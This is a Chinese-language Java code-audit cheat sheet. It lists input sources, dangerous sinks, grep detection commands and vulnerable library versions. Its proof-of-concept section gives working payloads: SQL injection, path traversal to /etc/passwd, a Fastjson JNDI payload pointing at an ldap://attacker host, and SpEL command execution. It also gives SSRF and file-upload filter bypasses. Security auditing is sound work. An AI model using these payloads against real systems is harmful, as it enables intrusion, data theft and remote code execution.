# Java Security Audit

> Java 安全审计模块 — Sink/Source 速查 + 检测命令

---

## Source (用户输入点)

```java
request.getParameter("name")       // @RequestParam String param
request.getHeader("X-Forwarded-For") // @RequestHeader String header
request.getCookies()               // @CookieValue String cookie
@RequestBody Object body           // request.getInputStream()
MultipartFile.getOriginalFilename() // 文件上传
@PathVariable String id            // 路径参数
```

---

## Sink 速查

### 反序列化
```java
ObjectInputStream.readObject()      // readUnshared() 同理
XMLDecoder.readObject()
JSON.parseObject() / JSON.parse()   // Fastjson
XStream.fromXML() / Yaml.load()     // XStream / SnakeYAML
ObjectMapper.readValue()            // Jackson + enableDefaultTyping
```

### JNDI / XXE / 命令执行
```java
InitialContext.lookup(可控参数)
JdbcRowSetImpl.setDataSourceName() + setAutoCommit()
DocumentBuilder.parse(可控输入)     // SAXParser/SAXReader/SAXBuilder同理
XMLInputFactory.createXMLStreamReader(可控输入)
Runtime.getRuntime().exec(cmd)
ProcessBuilder(cmd).start()
ScriptEngine.eval(code) / GroovyShell.evaluate(code)
```

### SQL / 文件 / 表达式
```java
Statement.executeQuery(拼接SQL)     // MyBatis ${} / @Query拼接
@DataScope AOP切面SQL拼接           // 隐蔽注入点
new File(可控路径) / Paths.get()    // FileInputStream同理
SpelExpressionParser.parseExpression() / Ognl.getValue() / MVEL.eval()
```

---

## 检测命令 (grep)

### SQL 注入
```bash
grep -rn '\$\{' --include="*.xml"                                          # MyBatis ${}
grep -rn "executeQuery.*\+" --include="*.java"                             # JDBC拼接
grep -rn "@Query.*nativeQuery.*true" --include="*.java"                    # Spring Data
grep -rn "QueryWrapper.*apply\|\.last\s*(" --include="*.java"              # MyBatis-Plus
grep -rn "createQuery\s*(" --include="*.java" -A 3 | grep -E "\+|format"  # HQL拼接
grep -rn "@RequestParam.*sort\|@RequestParam.*order" --include="*.java"    # ORDER BY
grep -rn "StringUtils\.format.*SQL\|@Aspect" --include="*.java"           # AOP SQL
```

### 反序列化 / JNDI / XXE
```bash
grep -rn "ObjectInputStream\|readObject\|XMLDecoder\|XStream\|JSON\.parse\|Yaml\.load" --include="*.java"
grep -rn "\.lookup\s*(\|InitialContext\|JdbcRowSetImpl\|\$\{jndi:" --include="*.java"
grep -rn "iiop://\|iiopname:\|corbaname:" --include="*.java"              # JDBC协议注入
grep -rn "DocumentBuilder\|SAXParser\|SAXReader\|XMLInputFactory" --include="*.java"
grep -rn "disallow-doctype-decl\|external-general-entities" --include="*.java"  # XXE防御
```

### 命令/表达式/SSRF/文件
```bash
grep -rn "Runtime\.getRuntime\|ProcessBuilder\|\.exec\s*(" --include="*.java"
grep -rn "SpelExpressionParser\|parseExpression\|MVEL\.eval\|OgnlUtil" --include="*.java"
grep -rn "new URL\|openConnection\|HttpClient\|RestTemplate\|WebClient" --include="*.java"
grep -rn "MultipartFile\|getOriginalFilename" --include="*.java"
grep -rn "@GetMapping.*download\|@PostMapping.*upload" --include="*.java"
grep -rn "String.*filePath.*=.*\\+" --include="*.java" -A 5 | grep "FileUtils\|FileInputStream"
```

### XSS / 反射 / 配置
```bash
grep -rn "class.*Wrapper.*HttpServletRequest" --include="*.java" -A 50 | \
  grep -c "getParameter\|getParameterValues\|getHeader"  # 过滤器完整性 (<3=不完整)
grep -rn "method\.invoke\|getDeclaredMethod\|Class\.forName" --include="*.java"
grep -rn "ApplicationContext\.getBean" --include="*.java"                  # 动态Bean
grep -ri "password:.*password\|password:.*123" --include="*.yml"
grep -ri "druid.*stat-view" --include="*.yml" -A 5 | grep "enabled.*true"
```

### 授权缺失
```bash
grep -rn "@PostMapping\|@PutMapping\|@DeleteMapping" --include="*.java"
grep -B 5 "public.*delete\|public.*update" [Controller] | grep "@PreAuthorize\|@Secured"
```

---

## 危险依赖速查

| 依赖 | 危险版本 | 利用方式 |
|------|----------|----------|
| commons-collections | 3.1-3.2.1, 4.0 | CC1-CC7 Gadget |
| commons-beanutils | 1.8.3-1.9.4 | CB1 Gadget |
| fastjson | < 1.2.83 | @type RCE |
| xstream | < 1.4.18 | XML RCE |
| log4j2 | < 2.17.0 | JNDI RCE |
| jackson | enableDefaultTyping | 反序列化 RCE |
| snakeyaml | < 2.0 | Constructor RCE |
| commons-text | 1.5-1.9 | Text4Shell |

---

## Quick PoC

```bash
# MyBatis ${} 注入
curl "http://app/api/list?orderBy=id desc;select version()"
# 路径遍历
curl "http://app/common/download?fileName=../../../../etc/passwd"
# Fastjson
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/exp","autoCommit":true}
# SpEL
T(java.lang.Runtime).getRuntime().exec("whoami")
```

---

## Practical Tips

### MyBatis ${} 审计流程
1. `grep -rn '\$\{' --include="*.xml"` 找所有用法
2. 追踪: Controller -> Service -> Mapper 参数来源
3. 重点: `ORDER BY ${field}` / `LIKE '%${user}%'` / `${params.dataScope}`
4. AOP切面(@DataScope)中的SQL拼接是隐蔽注入点

### SSRF IP 绕过
```
http://2130706433         # 127.0.0.1 十进制
http://0177.0.0.1         # 八进制
http://0x7f.0.0.1         # 十六进制
http://evil.com@127.0.0.1 # URL解析差异
```

### 文件上传绕过
- Content-Type伪造: `Content-Type: image/jpeg` + JSP内容
- 后缀检测: 双写(.jsjsp) / 大小写(.JSP) / 空字节(.jsp%00.jpg)

### XSS过滤器完整性
- 只重写 `getParameterValues()` 不够
- 必须同时重写 `getParameter()` / `getHeader()` / `getQueryString()`
- Spring MVC 数据绑定可能走 `getParameter()` 路径绕过
